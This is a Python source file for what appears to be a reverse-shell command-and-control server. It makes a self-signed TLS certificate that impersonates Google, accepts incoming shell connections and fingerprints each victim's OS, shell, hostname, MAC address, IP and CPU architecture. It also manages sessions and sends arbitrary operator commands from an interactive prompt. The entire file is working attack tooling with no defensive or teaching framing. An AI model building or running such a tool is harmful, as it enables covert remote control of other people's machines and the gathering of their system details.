import socket
import ssl
import subprocess
import secrets
import threading
import time
import datetime

def ouiSearch(mac:str):

    oui = ''.join(mac.split(":")[:3]).upper()

    if oui.lower() == "ffffff": return "broadcast" 

    with open("./core/ouis.txt", "r", encoding='utf-8') as f:
        for line in f:
            #print(line)
            soui, company = line.strip().split("=", 1)
            if soui == oui:
                return company
            
    return "unknown"

def cryptoRandom(length):
    s = ""
    letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for _ in range(length):
        a = secrets.randbelow(len(letters))
        s += letters[a]

    return s

class sslServer:
    def __init__(self, generatePassphrase=True,
                  cert="./ssl/cert.pem", key="./ssl/key.pem",
                    port=444, websock=None, autostart=True,
                    autoHarvest=True) -> None:

        # communication part
        self.commandQueue = {}
        self.responseQueue = {}
        self.uids = {}
        self.info = {}
        self.kill = []
        self.websock = websock

        self.onSuccess = self.doNothing # for debug

        self.aHarvest = autoHarvest

        # SSL socket part
        self.passphrase = None
        self.cert = cert
        self.key = key
        self.port = port

        if generatePassphrase:
            pwd = secrets.token_urlsafe(128)

            print("[SSL] [+] generating ssl certs..")
            subprocess.getoutput(' '.join(['openssl req -x509 -newkey rsa:4096 -keyout {}.pwd -out {} -days 365 -nodes -passin pass:{}'.format(key, cert, pwd),
                                 "-subj \"/C=US/ST=California/L=San Francisco/O=Google/CN=google.com\""]))
            
            subprocess.getoutput('openssl pkey -in {}.pwd -out {}'.format(key, key))
            print("[SSL] [+] done")

            self.passphrase = pwd

        if autostart: threading.Thread(target=self.start, daemon=True).start()

        pass

    def doNothing(self):
        return None

    def start(self, host="0.0.0.0"):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((host, self.port))
        server_socket.settimeout(5)
        server_socket.listen(5)

        print(f"[*] Listening on {host}:{self.port}")

        while True:
            while True:
                try:
                    client_socket, addr = server_socket.accept()
                    ssl_client_socket = ssl.wrap_socket(client_socket, server_side=True,
                                                        certfile=self.cert, keyfile=self.key,
                                                        ssl_version=ssl.PROTOCOL_TLSv1_2)
                    break
                except:
                    continue
                
            print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")


            ssl_client_socket.sendall(b'whoami\n')
            data = ssl_client_socket.recv(4096)
            if not data:
                break
            else:
                uid = cryptoRandom(20)
                print(uid)
                self.uids[uid] = ssl_client_socket
                threading.Thread(target=self.handle, args=(uid, ), daemon=True).start()

    def runCommand(self, uid, command, _async=False):
        data = []
        if _async:
            self.commandQueue[uid] = (command+'\n')
            return
        else:
            self.commandQueue[uid] = command+';echo 0\n'

        while True:
            if uid in list(self.responseQueue.keys()):
                data = self.responseQueue[uid]
                self.responseQueue.pop(uid)
                return data.strip()
            else:
                time.sleep(0.05)

    def harvestInfo(self, uid, sendCmd): # sendCmd is a seperate function for different types of shells
        """
        this harvests info regardless of shell, thanks to the sendCmd being an argument
        sendCmd must always be (cmd, uid)

        YOU must define sendCmd and pass it here
        """
        harvestedInfo = {}

        if not self.aHarvest:
            return harvestedInfo

        windows = False

        # harvest info
        shell = sendCmd("echo $SHELL", uid)
        if len(shell) > 1 and shell != "$SHELL":
            harvestedInfo["shelltype"] = shell
            harvestedInfo["os"] = "Linux"

        elif shell == "$SHELL":
            harvestedInfo["shelltype"] = "command prompt"
            harvestedInfo["os"] = "Windows"
            windows = True

        elif shell == "":
            if len(sendCmd("Get-Host", uid)) > 1:
                harvestedInfo["shelltype"] = "powershell"
                harvestedInfo["os"] = "Windows"
                windows = True

        # hostname
        harvestedInfo["hostname"] = sendCmd("whoami", uid)

        if windows:
            if harvestedInfo["shelltype"] == "powershell":
                harvestedInfo['mac'] = sendCmd("Get-NetAdapter | Where-Object { $_.InterfaceAlias -eq (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceAlias } | Select-Object -ExpandProperty MacAddress", uid).replace("-", ":")
                harvestedInfo['ip'] = sendCmd("$mainInterface = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceIndex; (Get-NetIPAddress | Where-Object { $_.InterfaceIndex -eq $mainInterface -and $_.AddressFamily -eq 'IPv4' }).IPAddress", uid)
                harvestedInfo['arch'] = "x86" if sendCmd("(Get-WmiObject -Class Win32_Processor).Architecture", uid) == "0" else "x64"
            else:
                harvestedInfo['mac'] = "idk"
                harvestedInfo['ip'] = "idk"
                harvestedInfo['arch'] = "probably x64"
        else:
            harvestedInfo['mac'] = sendCmd("ip -o link | awk '$2 != \"lo:\" {print $2, $(NF-2)}'", uid).split("\n")[0].split(": ")[-1]
            harvestedInfo['ip'] = sendCmd("ip route get 1 | awk '{print $NF; exit}'", uid)
            harvestedInfo['arch'] = sendCmd("lscpu | awk '/Architecture/ {print $2}'", uid)

        harvestedInfo['firstSeen'] = datetime.datetime.now().strftime("%H:%M")
        harvestedInfo['lastActive'] = datetime.datetime.now().strftime("%H:%M")
        harvestedInfo['uid'] = uid
        harvestedInfo['oui'] = ouiSearch(harvestedInfo['mac'])
        harvestedInfo['active'] = True

        print(harvestedInfo)

        return harvestedInfo

    def handle(self, uid):
        """
        get a grip!
        """

        harvestedInfo = {} 
        sock = self.uids[uid]

        def sendCmd(command, uid): # uid is only to take spot
            try:
                sock.sendall((command+'\n').encode('ascii'))
                a = sock.recv(2048*2).decode('ascii').strip()
            except:
                raise

            return a

        # harvest info

        harvestedInfo = self.harvestInfo(uid, sendCmd)

        self.info[uid] = harvestedInfo
        if self.websock != None: self.websock.send({"connection": self.info[uid]})

        print('got info')

        threading.Thread(target=self.onSuccess, daemon=True).start()
            
        while True:
            if uid in self.kill:
                sendCmd("exit", uid)
                print("killed {} (kill list)".format(uid))
                break
            
            if uid in self.commandQueue:

                try:
                    sock.sendall(self.commandQueue[uid].encode('ascii'))
                except:
                    print("killed")
                    return
                

                if type(self.commandQueue[uid]) == tuple:
                    threading.Thread(target=sock.recv, args=(2048*16,), daemon=True).start() # receive data and clear the socket without waiting for it - theres probaby a better way, but its whatever atp

                self.commandQueue.pop(uid)

                # recieve
                d = []
                while True:
                    recieved = sock.recv(2048*8).decode('ascii')
                    if recieved.strip()[-1] == "0":
                        d.append(recieved[:-1].strip())
                        self.responseQueue[uid] = "".join(d)
                        break
                    else:
                        d.append(recieved)
                    time.sleep(0.05)

            else:
                pass

            time.sleep(0.05)

        print('exit')



if __name__ == "__main__":
    HOST = "127.0.0.1"
    PORT = 443

    a = sslServer(autostart=False, autoHarvest=False)
    isControlling = False

    def manage():
        global isControlling
        uid = list(a.uids)[-1]
        print(uid)

        print(a.info[uid])
        if not isControlling:
            while True:
                print(a.runCommand(uid, input("command >")))

    a.onSuccess = manage

    a.start()
